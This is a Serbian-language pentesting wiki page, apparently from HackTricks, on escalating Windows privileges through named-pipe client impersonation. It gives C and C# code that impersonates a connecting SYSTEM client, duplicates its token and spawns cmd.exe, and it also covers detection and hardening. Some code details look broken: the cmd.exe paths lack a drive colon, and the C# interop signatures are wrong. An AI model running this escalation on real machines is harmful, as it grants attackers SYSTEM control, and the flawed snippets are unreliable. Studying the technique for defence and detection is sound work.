# Named Pipe Client Impersonation

{{#include ../../banners/hacktricks-training.md}}

Named Pipe client impersonation je primitiv za lokalno eskaliranje privilegija koji omogućava named-pipe server threadu da usvoji sigurnosni kontekst klijenta koji se poveže na njega. U praksi, napadač koji može da izvrši kod sa SeImpersonatePrivilege može da natera privilegovani klijent (npr. SYSTEM servis) da se poveže na pipe pod kontrolom napadača, pozove ImpersonateNamedPipeClient, duplicate-uje dobijeni token u primary token i pokrene proces kao taj klijent (često NT AUTHORITY\SYSTEM).

Ova stranica se fokusira na osnovnu tehniku. Za end-to-end exploit lanće koji prisiljavaju SYSTEM da se poveže na vaš pipe, pogledajte Potato family stranice navedene dalje.

## TL;DR
- Kreirajte named pipe: \\.\pipe\<random> i sačekajte konekciju.
- Naterajte privilegovanu komponentu da se poveže na njega (spooler/DCOM/EFSRPC/itd.).
- Pročitajte bar jednu poruku iz pipe-a, pa pozovite ImpersonateNamedPipeClient.
- Otvorite impersonation token sa trenutnog threada, DuplicateTokenEx(TokenPrimary) i koristite CreateProcessWithTokenW/CreateProcessAsUser da dobijete SYSTEM proces.

## Requirements and key APIs
- Privileges koji su obično potrebni procesu/threadu koji poziva:
- SeImpersonatePrivilege da biste uspešno impersonirali povezani klijent i da biste koristili CreateProcessWithTokenW.
- Alternativno, nakon impersonacije SYSTEM-a možete koristiti CreateProcessAsUser, što može zahtevati SeAssignPrimaryTokenPrivilege i SeIncreaseQuotaPrivilege (ovo je zadovoljeno kada impersonirate SYSTEM).
- Core APIs koji se koriste:
- CreateNamedPipe / ConnectNamedPipe
- ReadFile/WriteFile (neophodno je pročitati najmanje jednu poruku pre impersonacije)
- ImpersonateNamedPipeClient i RevertToSelf
- OpenThreadToken, DuplicateTokenEx(TokenPrimary)
- CreateProcessWithTokenW or CreateProcessAsUser
- Impersonation level: da biste izvršavali korisne akcije lokalno, klijent mora dozvoliti SecurityImpersonation (podrazumevano za mnoge lokalne RPC/named-pipe klijente). Klijenti mogu smanjiti ovo korišćenjem SECURITY_SQOS_PRESENT | SECURITY_IDENTIFICATION pri otvaranju pipe-a.

## Minimal Win32 workflow (C)
```c
// Minimal skeleton (no error handling hardening for brevity)
#include <windows.h>
#include <stdio.h>

int main(void) {
LPCSTR pipe = "\\\\.\\pipe\\evil";
HANDLE hPipe = CreateNamedPipeA(
pipe,
PIPE_ACCESS_DUPLEX,
PIPE_TYPE_MESSAGE | PIPE_READMODE_MESSAGE | PIPE_WAIT,
1, 0, 0, 0, NULL);

if (hPipe == INVALID_HANDLE_VALUE) return 1;

// Wait for privileged client to connect (see Triggers section)
if (!ConnectNamedPipe(hPipe, NULL)) return 2;

// Read at least one message before impersonation
char buf[4]; DWORD rb = 0; ReadFile(hPipe, buf, sizeof(buf), &rb, NULL);

// Impersonate the last message sender
if (!ImpersonateNamedPipeClient(hPipe)) return 3; // ERROR_CANNOT_IMPERSONATE==1368

// Extract and duplicate the impersonation token into a primary token
HANDLE impTok = NULL, priTok = NULL;
if (!OpenThreadToken(GetCurrentThread(), TOKEN_ALL_ACCESS, FALSE, &impTok)) return 4;
if (!DuplicateTokenEx(impTok, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &priTok)) return 5;

// Spawn as the client (often SYSTEM). CreateProcessWithTokenW requires SeImpersonatePrivilege.
STARTUPINFOW si = { .cb = sizeof(si) }; PROCESS_INFORMATION pi = {0};
if (!CreateProcessWithTokenW(priTok, LOGON_NETCREDENTIALS_ONLY,
L"C\\\\Windows\\\\System32\\\\cmd.exe", NULL,
0, NULL, NULL, &si, &pi)) {
// Fallback: CreateProcessAsUser after you already impersonated SYSTEM
CreateProcessAsUserW(priTok, L"C\\\\Windows\\\\System32\\\\cmd.exe", NULL,
NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);
}

RevertToSelf(); // Restore original context
return 0;
}
```
Napomene:
- Ako ImpersonateNamedPipeClient vrati ERROR_CANNOT_IMPERSONATE (1368), obavezno prvo pročitajte iz pipe-a i proverite da klijent nije ograničio impersonation na Identification level.
- Preporučuje se korišćenje DuplicateTokenEx sa SecurityImpersonation i TokenPrimary da biste kreirali primary token pogodan za kreiranje procesa.

## .NET brzi primer
U .NET-u, NamedPipeServerStream može da izvrši impersonation preko RunAsClient. Kada je u impersonation kontekstu, duplicirajte thread token i kreirajte proces.
```csharp
using System; using System.IO.Pipes; using System.Runtime.InteropServices; using System.Diagnostics;
class P {
[DllImport("advapi32", SetLastError=true)] static extern bool OpenThreadToken(IntPtr t, uint a, bool o, out IntPtr h);
[DllImport("advapi32", SetLastError=true)] static extern bool DuplicateTokenEx(IntPtr e, uint a, IntPtr sd, int il, int tt, out IntPtr p);
[DllImport("advapi32", SetLastError=true, CharSet=CharSet.Unicode)] static extern bool CreateProcessWithTokenW(IntPtr hTok, int f, string app, string cmd, int c, IntPtr env, string cwd, ref ProcessStartInfo si, out Process pi);
static void Main(){
using var s = new NamedPipeServerStream("evil", PipeDirection.InOut, 1);
s.WaitForConnection();
// Ensure client sent something so the token is available
s.RunAsClient(() => {
IntPtr t; if(!OpenThreadToken(Process.GetCurrentProcess().Handle, 0xF01FF, false, out t)) return; // TOKEN_ALL_ACCESS
IntPtr p; if(!DuplicateTokenEx(t, 0xF01FF, IntPtr.Zero, 2, 1, out p)) return; // SecurityImpersonation, TokenPrimary
var psi = new ProcessStartInfo("C\\Windows\\System32\\cmd.exe");
Process pi; CreateProcessWithTokenW(p, 2, null, null, 0, IntPtr.Zero, null, ref psi, out pi);
});
}
}
```
## Uobičajeni okidači/prisiljavanja da SYSTEM dođe do vašeg named pipe-a
Ove tehnike prisiljavaju privilegovane servise da se povežu na vaš named pipe tako da možete da preuzmete njihov identitet:
- Print Spooler RPC trigger (PrintSpoofer)
- DCOM activation/NTLM reflection variants (RoguePotato/JuicyPotato[NG], GodPotato)
- EFSRPC pipes (EfsPotato/SharpEfsPotato)

Pogledajte detaljno korišćenje i kompatibilnost ovde:

-
{{#ref}}
roguepotato-and-printspoofer.md
{{#endref}}
-
{{#ref}}
juicypotato.md
{{#endref}}

Ako vam treba kompletan primer kreiranja pipe-a i preuzimanja impersonacije da pokrenete proces kao SYSTEM iz okidača servisa, pogledajte:

-
{{#ref}}
from-high-integrity-to-system-with-name-pipes.md
{{#endref}}

## Otklanjanje problema i zamke
- Morate pročitati bar jednu poruku iz pipe-a pre poziva ImpersonateNamedPipeClient; inače ćete dobiti ERROR_CANNOT_IMPERSONATE (1368).
- Ako se klijent poveže sa SECURITY_SQOS_PRESENT | SECURITY_IDENTIFICATION, server ne može u potpunosti da impersonira; proverite nivo impersonacije tokena pomoću GetTokenInformation(TokenImpersonationLevel).
- CreateProcessWithTokenW zahteva SeImpersonatePrivilege na pozivaocu. Ako to ne uspe sa ERROR_PRIVILEGE_NOT_HELD (1314), koristite CreateProcessAsUser nakon što ste već impersonirali SYSTEM.
- Obezbedite da security descriptor vašeg pipe-a dozvoljava ciljnom servisu da se poveže ako ga dodatno ojačate; po defaultu, pipe-ovi pod \\.\pipe su dostupni u skladu sa serverovim DACL.

## Detekcija i ojačavanje
- Pratite kreiranje i konekcije named pipe-ova. Sysmon Event IDs 17 (Pipe Created) i 18 (Pipe Connected) su korisni za uspostavljanje referentne linije legitimnih imena pipe-ova i otkrivanje neobičnih, nasumičnih pipe-ova koji prethode događajima manipulacije tokenom.
- Pratite sekvence: proces kreira pipe, SYSTEM servis se povezuje, zatim proces koji je kreirao pipe pokreće potomka kao SYSTEM.
- Smanjite izloženost uklanjanjem SeImpersonatePrivilege sa nebitnih servisnih naloga i izbegavanjem nepotrebnih logovanja servisa sa visokim privilegijama.
- Defanzivni razvoj: pri povezivanju na nepouzdane named pipe-ove, navedite SECURITY_SQOS_PRESENT sa SECURITY_IDENTIFICATION da biste sprečili servere da u potpunosti impersoniraju klijenta osim ako nije neophodno.

## Reference
- Windows: ImpersonateNamedPipeClient dokumentacija (zahtevi za impersonaciju i ponašanje). https://learn.microsoft.com/en-us/windows/win32/api/namedpipeapi/nf-namedpipeapi-impersonatenamedpipeclient
- ired.team: Windows named pipes privilege escalation (uputstvo i primeri koda). https://ired.team/offensive-security/privilege-escalation/windows-namedpipes-privilege-escalation

{{#include ../../banners/hacktricks-training.md}}
